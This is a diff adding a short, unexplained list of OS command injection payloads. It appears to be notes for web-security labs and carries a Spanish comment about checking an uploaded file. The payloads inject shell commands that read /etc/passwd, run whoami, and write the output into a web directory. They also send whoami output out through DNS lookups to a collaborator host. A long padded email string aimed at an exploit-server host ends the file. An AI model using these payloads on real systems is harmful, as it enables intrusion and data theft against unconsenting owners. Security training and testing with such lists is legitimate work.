@@ -1,0 +1,15 @@
+$(cat /etc/passwd)
+$(cat+/etc/passwd)
+&
+&&
+|
+||
+;
+;whoami
+;ping -c 5 127.0.0.1||
+|| whoami > /var/www/images/whoami.txt||
+; whoami > /var/www/images/whoami.txt|| --> consultar el archivo subido
+|| nslookup collaborator.com||
+|| nslookup `whoami`.collaborator.com||
+
+peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpepeterpeteaaaaaaaaaaaaaartrpeter@dontwannacry.com.exploit-0adb008a04138914814fc4b101b7001e.exploit-server.net
